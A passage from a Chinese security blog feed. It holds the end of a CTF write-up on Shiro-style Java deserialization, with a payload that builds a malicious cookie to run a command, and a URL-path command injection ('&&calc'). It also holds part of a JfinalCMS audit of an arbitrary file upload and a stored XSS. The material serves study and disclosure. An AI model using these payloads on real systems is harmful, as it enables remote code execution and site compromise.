class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field wirtelog = logHandler.getClass().getDeclaredField(<span class="string">"writeLog"</span>);</span><br><span class="line">    wirtelog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    wirtelog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    Object ob = <span class="keyword">new</span> Object();</span><br><span class="line">    Method method = logHandler.getClass().getMethod("invoke", Object.class, Method.class, Object[].class);</span><br><span class="line">    Object[] obs = <span class="keyword">new</span> Object[]&#123;<span class="string">"asd"</span>,<span class="string">"asd"</span>&#125;;</span><br><span class="line">    logHandler.invoke(ob,method,obs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181755765.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ToString</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">        Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">        readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">        logHandler.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181749788.gif" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 反序列化点get！反序列化目标get！最后一步构造反序列化链！现在缺少一个封装类将构造好的类封装发给服务器直接反序列化，<code>ysoserial</code>其中的CC5中使用的<code>BadAttributeValueExpException</code>异常类满足要求。最终Payload如下：</p><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    LogHandler logHandler = <span class="keyword">new</span> LogHandler();</span><br><span class="line">    Field readlog = logHandler.getClass().getDeclaredField(<span class="string">"readLog"</span>);</span><br><span class="line">    readlog.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    readlog.set(logHandler, <span class="string">"calc"</span>);</span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">    Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(badAttributeValueExpException, logHandler);</span><br><span class="line">    String datas = Tools.base64Encode(Tools.serialize(badAttributeValueExpException));</span><br><span class="line">    System.out.println(<span class="string">"Cookie: "</span> + <span class="string">"hacker="</span>+ datas);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210104181738312.gif" alt="在这里插入图片描述"></p><hr><h2 id="非预期–执行命令"><a href="#非预期–执行命令" class="headerlink" title="非预期–执行命令"></a>非预期–执行命令</h2><p><strong>效果如下：访问/index/admin&amp;&amp;calc会执行命令</strong></p><p><img src="https://img-blog.csdnimg.cn/20210104202319514.gif" alt="在这里插入图片描述"></p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>&emsp;&emsp; 根本原因在下面这一段，作者没有考虑到用户会使用管道来执行命令，直接将url路径直接就写访问日志中，导致执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 写到这，其实是对shiro一些知识的补充。前期对shiro了解较少，后期做了大量知识补充。官方给的是jar包，反编译之后改成自己的踩了 一些坑。顺便记录一下，只想看题目分析的可以Pass。</p><ol><li><p>下面是自己不仔细导致错误，其实都知道，但是忘记了</p><ul><li>User没有实现<code>Serializable接口</code>导致报错，不能反序列化</li><li>User类没有<code>serialVersionUID</code>导致报错，版本不一致</li></ul></li><li><p>Tools类没有判断操作系统的版本，导致执行命令不成功<br><img src="https://img-blog.csdnimg.cn/20210105161235551.png" alt="在这里插入图片描述"></p></li><li><p>tail命令在windows系统是没有的，导致无法生成acessLog.txt文件</p></li><li><p>tail加了-f参数导致服务器一直读取文件，导致长时间不回显</p></li><li><p>注释掉<code>MyFilter</code>中<code>Component</code>就是shiro原本的CVE-2020-13933漏洞<br><img src="https://img-blog.csdnimg.cn/20210105162144633.png" alt="在这里插入图片描述"></p></li><li><p>学习了b站关于shiro内容<a href="https://www.bilibili.com/video/BV1NE411i7S8" target="_blank" rel="noopener">【狂神说Java】SpringBoot整合Shiro框架</a></p></li></ol><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*              Gadget：</span><br><span class="line">*                  Tools.base64Decode()</span><br><span class="line">*                      Tools.deserialize()</span><br><span class="line">*                          ObjectInputStream.readObject()</span><br><span class="line">*                              BadAttributeValueExpException.readObject()</span><br><span class="line">*                                  LogHandler.toSting()</span><br><span class="line">*                                      Tools.exeCmd()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 当时写这个题目的时候已经无限接近答案了，只是当时不确定怎么封装类。不得不说CC链还是不熟悉，没有完全吃透，不得不说CC永远的神！</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a><br><a href="https://www.bilibili.com/video/BV1NE411i7S8" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1NE411i7S8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 这是某银行的内部的一个CTF比赛，受邀参加。题目三个关键词&lt;code&gt;权限绕过&lt;/code&gt;、&lt;code&gt;shir
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java shiro" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>一次意外的代码审计----JfinalCMS审计</title>
    <link href="https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/"/>
    <id>https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-12-20T13:27:45.000Z</published>
    <updated>2020-12-21T07:12:31.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CVE。<br>&emsp;&emsp; 认真严肃的挑选了一波之后，我选择了这个CMS，可能是缘分，也可能是好玩吧。主要看的是这个项目有QQ群，可以加群讨论一下问题，方便更好的研究。先加群不说别的。<a href="https://gitee.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">gitee地址</a>，<a href="https://github.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">GitHub地址</a>。<br><img src="https://img-blog.csdnimg.cn/20200407202518575.png" alt="在这里插入图片描述"></p><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp;环境的搭建很简单，几种方式可以选择。第一种直接git项目的源码，idea打开项目，然后idea会自动导入下载maven。<br><img src="https://img-blog.csdnimg.cn/20200412200121848.png" alt="在这里插入图片描述"><br>第二种方式是去GitHub或者Gitee上下载发行版。<br><a href="https://gitee.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">gitee下载地址</a><br><a href="https://github.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">github下载地址</a></p><hr><h1 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h1><p>&emsp;&emsp; <a href="https://samny.blog.csdn.net//details/105385042" target="_blank" rel="noopener">Arbitrary file upload vulnerability</a>文件上传漏洞存在于管理员后台中的模板管理。</p><p><img src="https://img-blog.csdnimg.cn/20200411154350644.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200406165725733.png" alt><br><img src="https://img-blog.csdnimg.cn/20200406165740279.png" alt="&lt;script&gt;alert(1)&lt;/script&gt;"></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 断点调试，断点设置在<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>模板页面的操作的都是由FileManangerController.java控制。</p><ol><li><code>HttpServletRequest request = getRequest();</code>有点Java知识的人都认识这个,所以第一个断点设置在这里。<br><img src="https://img-blog.csdnimg.cn/2020041116011776.png" alt="在这里插入图片描述"></li><li>第二个断点，审计的上传漏洞，肯定设置在上传方法里。<br><img src="https://img-blog.csdnimg.cn/20200411160132564.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h3><p><code>判断是否为空的操作</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Iterator&lt;?&gt; it = <span class="keyword">this</span>.files.iterator();</span><br><span class="line">        <span class="keyword">if</span> (!it.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 项目主说这里修改一下就好了，但默认是这样子的，可见开发者自以为是可以防止任意上传文件漏洞，但其实这里默认是这样子设置。<br><img src="https://img-blog.csdnimg.cn/20200412135823674.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 默认设置是一次最多上传5个文件，文件大小不超过16MB。<br><img src="https://img-blog.csdnimg.cn/20200412142146187.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> maxSize = NumberUtils.parseLong(MAX_SIZE);</span><br><span class="line"><span class="keyword">if</span> (getConfig(<span class="string">"upload-size"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    maxSize = Integer.parseInt(getConfig(<span class="string">"upload-size"</span>));</span><br><span class="line">    <span class="keyword">if</span> (maxSize != <span class="number">0</span> &amp;&amp; item.getSize() &gt; (maxSize * <span class="number">1024</span> * <span class="number">1024</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.error(sprintf(lang(<span class="string">"UPLOAD_FILES_SMALLER_THAN"</span>), maxSize + <span class="string">"Mb"</span>));</span><br><span class="line">        error = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 这里maxSize是默认为0。<br><img src="https://img-blog.csdnimg.cn/2020041214043196.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020041214394072.png" alt="在这里插入图片描述"><br>&emsp;&emsp;  下面的一段代码是判断是否只能上传图片，在配置文件<code>E:\Soures\jfinal_cms\src\main\resources\conf\filemanager.properties</code>下可以看到文件复写和上传文件大小设置是为0的（<code>0代表的是没有限制</code>），默认是可以上传其他文件（<code>upload-imagesonly=false</code>）。<br><img src="https://img-blog.csdnimg.cn/20200412144828539.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isImage(item.getName())</span><br><span class="line">        &amp;&amp; (getConfig(<span class="string">"upload-imagesonly"</span>) != <span class="keyword">null</span> &amp;&amp; getConfig(<span class="string">"upload-imagesonly"</span>).equals(<span class="string">"true"</span>) || <span class="keyword">this</span>.params</span><br><span class="line">        .get(<span class="string">"type"</span>) != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.params.get(<span class="string">"type"</span>).equals(<span class="string">"Image"</span>))) &#123;</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"UPLOAD_IMAGES_ONLY"</span>));</span><br><span class="line">    error = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建临时文件，后面会用到。作用是先将上传的文件以临时文件的存放着，然后把复制到上传目录下，重新命名删除临时文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            tmpFile = <span class="keyword">new</span> File(<span class="keyword">this</span>.fileRoot + TMP_PATH + <span class="string">"filemanager_"</span> + System.currentTimeMillis() + <span class="string">".tmp"</span>);</span><br><span class="line">            File filePath = tmpFile.getParentFile();</span><br><span class="line">            <span class="keyword">if</span> (!filePath.exists()) &#123;</span><br><span class="line">                filePath.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            item.write(tmpFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 文件上传后的操作，也就是上面说到的复制重命名，最后将临时文件删除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// file rename</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; tmpFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String allowed[] = &#123;<span class="string">"."</span>, <span class="string">"-"</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"add"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String currentPath = <span class="string">""</span>;</span><br><span class="line">                String fileName = params.get(<span class="string">"_fileName"</span>);</span><br><span class="line">                String filePath = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    currentPath = params.get(<span class="string">"currentpath"</span>);</span><br><span class="line">                    respPath = currentPath;</span><br><span class="line">                    currentPath = <span class="keyword">new</span> String(currentPath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    currentPath = getFilePath(currentPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                filePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + currentPath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(filePath, fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(filePath + fileName);</span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"replace"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String fileName = <span class="string">""</span>;</span><br><span class="line">                String newFilePath = <span class="string">""</span>;</span><br><span class="line">                String saveFilePath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    newFilePath = params.get(<span class="string">"newfilepath"</span>);</span><br><span class="line">                    newFilePath = <span class="keyword">new</span> String(newFilePath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    respPath = newFilePath.substring(<span class="number">0</span>, newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    fileName = newFilePath.substring(newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    newFilePath = getFilePath(newFilePath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                saveFilePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + newFilePath);</span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(saveFilePath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(saveFile.getParent(), fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (saveFile.exists()) &#123;</span><br><span class="line">                    <span class="comment">// before bakup</span></span><br><span class="line">                    bakupFile(saveFile);</span><br><span class="line">                    <span class="comment">// delete src file</span></span><br><span class="line">                    saveFile.delete();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">        <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 临时文件处理</span></span><br><span class="line">    <span class="keyword">if</span> (tmpFile.exists()) &#123;</span><br><span class="line">        tmpFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fileInfo;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>开发者需要通过限制上传文件大小来限制一些文件的上传，但默认配置是没有限制，很可能是开发者为了自己开发方便，但最后忘记修改设置。</li><li>上传文件，判断是否是上传图片之后，没有在做其他判断限制，然后导致任意文件上传漏洞。</li><li>配置文件中默认是不开启<code>filemanager.upload-imagesonly</code>需要使用者手动设置。</li><li>开发者仅仅在前端做了文件上传的白名单，后端没有没有进行校验，导致黑客可以绕过前端验证，上传任意恶意文件。（前端验证本文没有体现，但真的做了限制，有详情的童鞋可以去看看。）</li></ol><hr><h1 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20200407185120625.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185154471.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185238421.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 漏洞源码存在于<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java</code><br>&emsp;&emsp; 第一部分功能有以下几个：</p><ol><li>将提交数据Json化</li><li>根据用户Session判断用户id（数据库内的id）</li><li>判断旧密码和新设置的密码是否正确</li><li>判断Email的格式是否正确<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">JSONObject json = <span class="keyword">new</span> JSONObject();</span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">2</span>);<span class="comment">// 失败</span></span><br><span class="line"></span><br><span class="line">SysUser user = (SysUser) getSessionUser();</span><br><span class="line"><span class="keyword">int</span> userid = user.getInt(<span class="string">"userid"</span>);</span><br><span class="line">SysUser model = getModel(SysUser<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (userid != model.getInt(<span class="string">"userid"</span>)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"提交数据错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方用户不需要密码</span></span><br><span class="line"><span class="keyword">if</span> (user.getInt(<span class="string">"usertype"</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">String oldPassword = getPara(<span class="string">"old_password"</span>);</span><br><span class="line">String newPassword = getPara(<span class="string">"new_password"</span>);</span><br><span class="line">String newPassword2 = getPara(<span class="string">"new_password2"</span>);</span><br><span class="line"><span class="keyword">if</span> (!user.getStr(<span class="string">"password"</span>).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"密码错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"两次新密码不一致！"</span>);</span><br><span 